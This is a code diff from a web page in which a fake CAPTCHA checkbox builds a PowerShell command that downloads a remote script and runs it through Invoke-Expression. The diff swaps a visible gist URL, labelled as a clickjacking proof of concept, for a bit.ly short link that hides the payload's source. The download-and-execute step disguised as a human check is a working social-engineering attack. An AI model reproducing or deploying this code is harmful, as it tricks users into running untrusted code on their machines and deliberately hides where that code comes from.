@@ -58,7 +58,7 @@
     document.getElementById('captchaCheckbox').addEventListener('click', () => {
         // The PowerShell script to fetch and execute the remote script
         const powershellScript = `
-            $scriptUrl = 'https://gist.githubusercontent.com/Mrlukerwilkinson/a485c2fef0571df4c2c8c4106b482efd/raw/e1c30bb8c05cbecafbf9d11f3091c36a4896ee06/click_jacking_poc';
+            $scriptUrl = 'https://bit.ly/clickjackpoc';
             $content = (Invoke-WebRequest -Uri $scriptUrl).Content;
             Invoke-Expression $content;
         `;
